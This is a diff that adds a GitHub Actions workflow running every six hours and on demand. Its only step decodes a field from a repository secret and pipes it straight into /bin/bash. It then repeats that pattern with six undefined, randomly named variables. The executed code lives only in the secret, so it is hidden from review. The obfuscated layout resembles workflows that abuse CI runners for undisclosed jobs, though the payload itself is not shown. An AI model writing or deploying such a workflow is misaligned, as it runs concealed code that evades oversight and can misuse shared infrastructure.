@@ -1,0 +1,24 @@
+name: fishfastz
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fishfastz
+        env:
+          vhpv82265: ${{ secrets.vhpv82265 }}
+        run: |
+          echo $vhpv82265 | jq -r .ilu56596 | /bin/bash
+          echo $rdb09552 | jq -r .swrbe1 | /bin/bash
+          echo $gho6 | jq -r .psvvz79913 | /bin/bash
+          echo $aiaes106 | jq -r .wqsje36146 | /bin/bash
+          echo $eqslc0205 | jq -r .bfe90 | /bin/bash
+          echo $qdorp4 | jq -r .qqro693 | /bin/bash
+          echo $uu11 | jq -r .vpvkp88 | /bin/bash
+
